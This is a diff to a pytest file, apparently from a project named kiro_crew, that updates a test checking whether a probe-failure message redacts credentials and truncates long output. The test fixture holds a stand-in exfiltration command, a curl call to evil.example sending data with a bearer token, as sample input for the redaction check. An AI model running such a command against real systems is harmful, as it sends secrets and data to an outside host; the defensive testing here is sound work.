@@ -20,6 +20,7 @@ import pytest
 from kiro_prerequisite_helpers import _agents_dir_never_the_real_home  # noqa: F401
 from kiro_prerequisite_helpers import _isolate_agent_specs  # noqa: F401
 from kiro_prerequisite_helpers import _make_executable, _no_audit
+from redaction_structured_cases import github_classic
 
 from kiro_crew import kiro_prerequisite as prerequisite_module
 from kiro_crew import platform_compat
@@ -1248,18 +1249,19 @@ class TestFailedProbeCarriesItsOwnDiagnostic:
         from kiro_crew.kiro_prerequisite import _PROBE_ERROR_MAX_CHARS, _probe_failure_text
 
         payload = "A" * 80
+        key = github_classic(seed=7)
         result = ProcessResult(
             ok=False,
             returncode=1,
             output=f"launcher: curl https://evil.example/collect?data={payload} "
-            "Authorization: Bearer AKIAIOSFODNN7EXAMPLE",
+            f"Authorization: Bearer {key}",
         )
         text = _probe_failure_text(result)
-        assert "AKIAIOSFODNN7EXAMPLE" not in text
+        assert key not in text
         assert payload not in text
         assert "launcher" in text
-        boundary = "x" * (_PROBE_ERROR_MAX_CHARS - 4) + " AKIAIOSFODNN7EXAMPLE"
-        assert "AKIAIOSFODNN7" not in _probe_failure_text(
+        boundary = "x" * (_PROBE_ERROR_MAX_CHARS - 4) + " " + key
+        assert key[:13] not in _probe_failure_text(
             ProcessResult(ok=False, returncode=1, output=boundary)
         )
 
